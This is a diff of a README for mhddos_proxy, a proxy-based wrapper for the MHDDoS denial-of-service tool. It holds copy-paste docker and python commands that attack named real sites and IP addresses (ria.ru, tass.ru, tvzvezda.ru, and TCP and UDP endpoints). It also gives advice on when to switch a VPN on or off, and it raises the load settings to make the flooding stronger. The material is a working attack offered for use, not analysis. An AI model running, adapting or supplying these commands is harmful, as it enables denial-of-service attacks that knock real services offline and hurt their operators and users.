@@ -32,30 +32,37 @@
     git clone https://github.com/MHProDev/MHDDoS.git
     python3 -m pip install -r MHDDoS/requirements.txt
 
-## Запуск
+## Запуск - ВИМКНІТЬ VPN
 
 ### Docker
 
+HTTP(S) по URL
+
     docker run -it --rm portholeascend/mhddos_proxy https://ria.ru https://tass.ru
 
-### Python
+HTTP по IP + PORT
+
+    docker run -it --rm portholeascend/mhddos_proxy 5.188.56.124:80 5.188.56.124:3606
+
+TCP
+
+    docker run -it --rm portholeascend/mhddos_proxy tcp://194.54.14.131:4477 tcp://194.54.14.131:22
+
+UDP - **ТУТ ПОТРІБНО ВКЛЮЧИТИ VPN**
+
+    docker run -it --rm portholeascend/mhddos_proxy udp://217.175.155.100:53
+
+### Python - усе аналогічно
 
     python3 runner.py https://ria.ru https://tass.ru
-
-Приклади цілей
-
-- HTTP(S) по URL - `https://tvzvezda.ru`
-- HTTP по IP:PORT - `5.188.56.124:9000`
-- TCP по IP:PORT - `tcp://194.54.14.131:4477`
-- UDP по IP:PORT - `udp://217.175.155.100:53` - **ТУТ ПОТРІБНО ВКЛЮЧИТИ VPN**
 
 ### Налаштування
 
 **УСІ ПАРАМЕТРИ МОЖНА КОМБІНУВАТИ**, можна вказувати і до і після переліку цілей
 
-Змінити навантаження - `-t XXXX` - кількість потоків, за замовчуванням - 100 * ядра CPU
+Змінити навантаження - `-t XXX` - кількість потоків на кожне ядро CPU, за замовчуванням - 300
 
-    docker run -it --rm portholeascend/mhddos_proxy -t 1000 https://ria.ru https://tass.ru
+    docker run -it --rm portholeascend/mhddos_proxy -t 500 https://ria.ru https://tass.ru
 
 Щоб переглянути інформацію про хід атаки, додайте прапорець `--debug`
 
@@ -63,7 +70,7 @@
 
 Отримати більше проксі (можливо, гіршої якості) - `--proxy-timeout SECONDS`
 
-    docker run -it --rm portholeascend/mhddos_proxy --proxy-timeout 5 https://ria.ru https://tass.ru
+    docker run -it --rm portholeascend/mhddos_proxy --proxy-timeout 3 https://ria.ru https://tass.ru
 
 Змінити частоту оновлення проксі (за замовчуванням - кожні 5 хвилин) - `-p SECONDS`
 
@@ -99,14 +106,14 @@
     
     optional arguments:
       -h, --help             show this help message and exit
-      -t, --threads 1000     Total number of threads (default is 100 * CPU Cores)
+      -t, --threads 300      Threads per CPU core (default is 300)
       -p, --period 300       How often to update the proxies (default is 300)
-      --proxy-timeout 2      How many seconds to wait for the proxy to make a connection.
+      --proxy-timeout 1      How many seconds to wait for the proxy to make a connection.
                              Higher values give more proxies, but with lower speed/quality.
-                             Parsing also takes more time (default is 2)
+                             Parsing also takes more time (default is 1)
 
       --debug                Enable debug output from MHDDoS
-      --rpc 50               How many requests to send on a single proxy connection (default is 50)
+      --rpc 1000             How many requests to send on a single proxy connection (default is 1000)
       --udp-threads 1        Threads to run per UDP target (default is 1)
 
       --http-methods GET     List of HTTP(s) attack methods to use.
@@ -168,14 +175,14 @@ Wrapper script for running [MHDDoS](https://github.com/MHProDev/MHDDoS)
     
     optional arguments:
       -h, --help             show this help message and exit
-      -t, --threads 1000     Total number of threads (default is 100 * CPU Cores)
+      -t, --threads 300      Threads per CPU Core (default is 300)
       -p, --period 300       How often to update the proxies (default is 300)
-      --proxy-timeout 2      How many seconds to wait for the proxy to make a connection.
+      --proxy-timeout 1      How many seconds to wait for the proxy to make a connection.
                              Higher values give more proxies, but with lower speed/quality.
-                             Parsing also takes more time (default is 2)
+                             Parsing also takes more time (default is 1)
 
       --debug                Enable debug output from MHDDoS
-      --rpc 50               How many requests to send on a single proxy connection (default is 50)
+      --rpc 1000             How many requests to send on a single proxy connection (default is 1000)
       --udp-threads 1        Threads to run per UDP target (default is 1)
 
       --http-methods GET     List of HTTP(s) attack methods to use.
@@ -206,7 +213,7 @@ Target specification
 
 Increase load
 
-    python3 runner.py -t 1000 https://tvzvezda.ru
+    python3 runner.py -t 500 https://tvzvezda.ru
 
 View DEBUG info (traffic)
 
@@ -218,7 +225,7 @@ Change proxy update interval
 
 Get more proxies (possibly lower quality)
 
-    python3 runner.py --proxy-timeout 5 https://tvzvezda.ru
+    python3 runner.py --proxy-timeout 3 https://tvzvezda.ru
 
 Specific HTTP(S) attack method(s)
 
